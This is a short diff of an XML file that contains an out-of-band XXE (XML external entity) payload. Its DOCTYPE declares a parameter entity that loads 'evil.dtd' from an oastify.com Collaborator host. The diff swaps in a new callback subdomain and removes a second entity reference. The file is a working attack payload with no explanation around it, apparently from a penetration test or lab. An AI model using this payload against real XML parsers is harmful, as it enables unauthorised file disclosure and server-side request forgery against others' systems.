@@ -1,9 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
- 
   <!-- Fetch the external DTD from your Collaborator payload -->
-  <!ENTITY % remote SYSTEM "http://1dftiu1csbjkt5q3hcnphez0mrsigd42.oastify.com/evil.dtd">
-  %remote;%param1;
+  <!ENTITY % remote SYSTEM "http://vhgnmo56w5nexzuxl6rjl83uqlwek88x.oastify.com/evil.dtd">
+  %remote;
 ]>
 <contacts>
     <contact>
